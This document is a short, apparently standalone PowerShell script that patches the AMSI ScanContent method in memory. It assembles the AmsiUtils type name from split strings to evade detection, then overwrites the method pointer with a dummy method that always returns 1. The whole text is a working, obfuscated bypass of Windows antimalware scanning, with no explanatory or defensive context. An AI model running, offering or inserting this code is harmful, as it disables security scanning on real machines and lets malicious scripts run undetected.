class Tro1{static [int] M([string]$a,[string]$b){return 1}}
$c = "em.Ma"
$d = ".Autom"
$e = "ion.A"
$f = "System"
$g = "Runtime"
$h = "Inter"
$i = "opServices"
$j = "Marshal"
$full_string = "[$f.$g.$h$i.$j]"
$o = [Ref].Assembly.GetType("Syst$c"+"nag"+"eme"+"nt$d"+"at$e"+"ms"+"iU"+"ti"+"ls").GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [Tro1].GetMethods() | Where-Object Name -eq 'M'
$runt = Invoke-Expression $full_string
[System.Runtime.InteropServices.Marshal]::Copy(@($runt::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
